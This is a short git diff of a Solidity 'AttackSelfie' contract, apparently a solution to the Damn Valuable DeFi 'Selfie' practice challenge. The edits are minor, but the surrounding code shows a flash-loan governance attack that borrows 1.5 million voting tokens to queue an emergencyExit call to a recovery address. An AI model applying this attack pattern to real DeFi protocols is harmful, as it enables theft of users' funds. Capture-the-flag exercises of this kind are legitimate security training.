@@ -15,14 +15,15 @@ contract AttackSelfie {
     SimpleGovernance governance;
     DamnValuableVotes damnValuableToken;
     uint256 actionId;
+
     bytes32 CALL_BACK_SUCCESS = keccak256("ERC3156FlashBorrower.onFlashLoan");
 
     constructor(
-        address _selfiePool,
+        address _pool,
         address _governance,
         address _token
     ) {
-        pool = SelfiePool(_selfiePool);
+        pool = SelfiePool(_pool);
         governance = SimpleGovernance(_governance);
         damnValuableToken = DamnValuableVotes(_token);
     }
@@ -47,7 +48,7 @@ contract AttackSelfie {
         return CALL_BACK_SUCCESS;
     }
 
-    function attackSetup(address recovery) external {
+    function attackSetup(address recovery) external returns(bool) {
         uint amountRequired = 1500000 ether;
         bytes memory data = abi.encodeWithSignature("emergencyExit(address)", recovery);
         
@@ -57,6 +58,8 @@ contract AttackSelfie {
             amountRequired,
             data
         );
+        
+        return true;
     }
 
     function attackExecution() external returns (bool) {
